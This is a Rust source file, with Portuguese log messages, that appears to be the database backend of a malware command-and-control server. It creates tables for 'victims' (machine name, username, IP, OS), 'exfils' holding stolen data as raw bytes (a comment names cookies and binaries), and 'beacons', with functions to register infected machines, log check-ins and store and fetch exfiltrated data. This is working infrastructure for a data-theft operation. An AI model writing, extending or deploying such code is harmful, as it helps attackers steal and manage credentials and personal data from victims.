#![allow(unused_imports)]

use sqlx::{PgPool, postgres::PgPoolOptions, Row};
use crate::models::{Victim, ExfilData, Beacon};
use anyhow::Result;
use chrono::{Utc, DateTime};
use uuid::Uuid;
use tracing::error;

#[derive(Clone)]
pub struct Database {
    pool: PgPool,
}

impl Database {
    pub async fn new(database_url: &str) -> Result<Self> {
        println!("[DB] Conectando ao banco de dados...");
        
        let pool = PgPoolOptions::new()
            .max_connections(5)
            .connect(database_url)
            .await?;
        
        println!("[DB] Conexão estabelecida. Criando tabelas...");
        
        // Create victims table
        sqlx::query(
            r#"
            CREATE TABLE IF NOT EXISTS victims (
                id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
                machine_name TEXT NOT NULL,
                username TEXT NOT NULL,
                ip_address TEXT NOT NULL,
                first_seen TIMESTAMPTZ NOT NULL,
                last_seen TIMESTAMPTZ NOT NULL,
                os_version TEXT,
                total_exfils INTEGER DEFAULT 0
            )
            "#
        )
        .execute(&pool)
        .await?;
        
        // Create exfils table - data como BYTEA
        sqlx::query(
            r#"
            CREATE TABLE IF NOT EXISTS exfils (
                id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
                victim_id UUID NOT NULL REFERENCES victims(id) ON DELETE CASCADE,
                data_type TEXT NOT NULL,
                data BYTEA NOT NULL,
                timestamp TIMESTAMPTZ NOT NULL,
                size INTEGER
            )
            "#
        )
        .execute(&pool)
        .await?;
        
        // Create index for exfils on victim_id
        sqlx::query(
            r#"
            CREATE INDEX IF NOT EXISTS idx_exfils_victim_id ON exfils(victim_id)
            "#
        )
        .execute(&pool)
        .await?;
        
        // Create index for exfils on timestamp
        sqlx::query(
            r#"
            CREATE INDEX IF NOT EXISTS idx_exfils_timestamp ON exfils(timestamp)
            "#
        )
        .execute(&pool)
        .await?;
        
        // Create beacons table
        sqlx::query(
            r#"
            CREATE TABLE IF NOT EXISTS beacons (
                id SERIAL PRIMARY KEY,
                victim_id UUID NOT NULL REFERENCES victims(id) ON DELETE CASCADE,
                timestamp TIMESTAMPTZ NOT NULL,
                status TEXT
            )
            "#
        )
        .execute(&pool)
        .await?;
        
        // Create index for beacons on victim_id
        sqlx::query(
            r#"
            CREATE INDEX IF NOT EXISTS idx_beacons_victim_id ON beacons(victim_id)
            "#
        )
        .execute(&pool)
        .await?;
        
        println!("[DB] Todas as tabelas criadas/verificadas com sucesso!");
        
        Ok(Self { pool })
    }
    
    pub async fn register_victim(
        &self,
        machine_name: &str,
        username: &str,
        ip_address: &str,
        os_version: Option<&str>,
    ) -> Result<String> {
        let id = Uuid::new_v4();
        let now = Utc::now();
        
        sqlx::query(
            r#"
            INSERT INTO victims (id, machine_name, username, ip_address, first_seen, last_seen, os_version, total_exfils)
            VALUES ($1, $2, $3, $4, $5, $6, $7, 0)
            "#
        )
        .bind(&id)
        .bind(machine_name)
        .bind(username)
        .bind(ip_address)
        .bind(now)
        .bind(now)
        .bind(os_version)
        .execute(&self.pool)
        .await?;
        
        println!("[DB] Nova vítima registrada: {} ({})", machine_name, id);
        
        Ok(id.to_string())
    }
    
    pub async fn update_victim_last_seen(&self, victim_id: &str) -> Result<()> {
        let victim_uuid = Uuid::parse_str(victim_id)?;
        
        sqlx::query(
            r#"
            UPDATE victims 
            SET last_seen = $1 
            WHERE id = $2
            "#
        )
        .bind(Utc::now())
        .bind(victim_uuid)
        .execute(&self.pool)
        .await?;
        
        Ok(())
    }
    
    pub async fn add_exfil(
        &self,
        victim_id: &str,
        data_type: &str,
        data: &str,
    ) -> Result<String> {
        let id = Uuid::new_v4();
        let victim_uuid = Uuid::parse_str(victim_id)?;
        let now = Utc::now();
        let size = data.len() as i32;
        
        println!("[DB] Salvando exfil: type={}, size={} bytes", data_type, size);
        
        let mut tx = self.pool.begin().await?;
        
        sqlx::query(
            r#"
            INSERT INTO exfils (id, victim_id, data_type, data, timestamp, size)
            VALUES ($1, $2, $3, $4, $5, $6)
            "#
        )
        .bind(&id)
        .bind(victim_uuid)
        .bind(data_type)
        .bind(data.as_bytes())
        .bind(now)
        .bind(size)
        .execute(&mut *tx)
        .await?;
        
        sqlx::query(
            r#"
            UPDATE victims 
            SET total_exfils = total_exfils + 1 
            WHERE id = $1
            "#
        )
        .bind(victim_uuid)
        .execute(&mut *tx)
        .await?;
        
        tx.commit().await?;
        
        println!("[DB] Exfil salvo com ID: {}", id);
        
        Ok(id.to_string())
    }
    
    // MÉTODO PARA SALVAR BYTES (COOKIES, BINÁRIOS, ETC)
    pub async fn add_exfil_bytes(
        &self,
        victim_id: &str,
        data_type: &str,
        data: &[u8],
    ) -> Result<String> {
        let id = Uuid::new_v4();
        let victim_uuid = Uuid::parse_str(victim_id)?;
        let now = Utc::now();
        let size = data.len() as i32;
        
        println!("[DB] Salvando exfil bytes: type={}, size={} bytes", data_type, size);
        
        if !data.is_empty() {
            if let Ok(text) = std::str::from_utf8(&data[..std::cmp::min(50, data.len())]) {
                println!("[DB] Preview: {}...", text);
            } else {
                println!("[DB] Preview (hex): {:02x?}", &data[..std::cmp::min(20, data.len())]);
            }
        }
        
        let mut tx = self.pool.begin().await?;
        
        sqlx::query(
            r#"
            INSERT INTO exfils (id, victim_id, data_type, data, timestamp, size)
            VALUES ($1, $2, $3, $4, $5, $6)
            "#
        )
        .bind(&id)
        .bind(victim_uuid)
        .bind(data_type)
        .bind(data)
        .bind(now)
        .bind(size)
        .execute(&mut *tx)
        .await?;
        
        sqlx::query(
            r#"
            UPDATE victims 
            SET total_exfils = total_exfils + 1 
            WHERE id = $1
            "#
        )
        .bind(victim_uuid)
        .execute(&mut *tx)
        .await?;
        
        tx.commit().await?;
        
        println!("[DB] Exfil bytes salvo com ID: {}", id);
        
        Ok(id.to_string())
    }
    
    pub async fn add_beacon(
        &self,
        victim_id: &str,
        status: &str,
    ) -> Result<()> {
        let victim_uuid = Uuid::parse_str(victim_id)?;
        
        sqlx::query(
            r#"
            INSERT INTO beacons (victim_id, timestamp, status)
            VALUES ($1, $2, $3)
            "#
        )
        .bind(victim_uuid)
        .bind(Utc::now())
        .bind(status)
        .execute(&self.pool)
        .await?;
        
        self.update_victim_last_seen(victim_id).await?;
        
        Ok(())
    }
    
    pub async fn list_victims(&self) -> Result<Vec<Victim>> {
        let rows = sqlx::query(
            r#"
            SELECT id, machine_name, username, ip_address, first_seen, last_seen, 
                   COALESCE(os_version, 'Unknown') as os_version, total_exfils
            FROM victims
            ORDER BY last_seen DESC
            "#
        )
        .fetch_all(&self.pool)
        .await?;
        
        let mut victims = Vec::with_capacity(rows.len());
        for row in rows {
            let id: Uuid = row.get(0);
            victims.push(Victim {
                id: id.to_string(),
                machine_name: row.get(1),
                username: row.get(2),
                ip_address: row.get(3),
                first_seen: row.get(4),
                last_seen: row.get(5),
                os_version: row.get(6),
                total_exfils: row.get(7),
            });
        }
        
        Ok(victims)
    }
    
    pub async fn get_victim_exfils(&self, victim_id: &str) -> Result<Vec<ExfilData>> {
        let victim_uuid = Uuid::parse_str(victim_id)?;
        
        let rows = sqlx::query(
            r#"
            SELECT id, victim_id, data_type, data, timestamp
            FROM exfils
            WHERE victim_id = $1
            ORDER BY timestamp DESC
            "#
        )
        .bind(victim_uuid)
        .fetch_all(&self.pool)
        .await?;
        
        let mut exfils = Vec::with_capacity(rows.len());
        for row in rows {
            let _id: Uuid = row.get(0);
            let victim_id: Uuid = row.get(1);
            let data: Vec<u8> = row.get(3);
            
            exfils.push(ExfilData {
                victim_id: victim_id.to_string(),
                machine_name: String::new(),
                username: String::new(),
                ip_address: String::new(),
                data_type: row.get(2),
                data: String::from_utf8_lossy(&data).to_string(),
                timestamp: row.get(4),
            });
        }
        
        Ok(exfils)
    }
    
    pub async fn get_exfil_by_id(&self, id: &str) -> Result<Option<ExfilData>> {
        let exfil_uuid = Uuid::parse_str(id)?;
        
        let row = sqlx::query(
            r#"
            SELECT e.id, e.victim_id, e.data_type, e.data, e.timestamp,
                   v.machine_name, v.username, v.ip_address
            FROM exfils e
            JOIN victims v ON e.victim_id = v.id
            WHERE e.id = $1
            "#
        )
        .bind(exfil_uuid)
        .fetch_optional(&self.pool)
        .await?;
        
        Ok(row.map(|row| {
            let victim_id: Uuid = row.get(1);
            let data: Vec<u8> = row.get(3);
            
            ExfilData {
                victim_id: victim_id.to_string(),
                machine_name: row.get(5),
                username: row.get(6),
                ip_address: row.get(7),
                data_type: row.get(2),
                data: String::from_utf8_lossy(&data).to_string(),
                timestamp: row.get(4),
            }
        }))
    }
    
    // MÉTODO PARA BUSCAR DADOS BRUTOS (BYTES) POR ID
    pub async fn get_exfil_bytes_by_id(&self, id: &str) -> Result<Option<Vec<u8>>> {
        let exfil_uuid = Uuid::parse_str(id)?;
        
        let row = sqlx::query(
            r#"
            SELECT data
            FROM exfils
            WHERE id = $1
            "#
        )
        .bind(exfil_uuid)
        .fetch_optional(&self.pool)
        .await?;
        
        Ok(row.map(|row| row.get(0)))
    }
}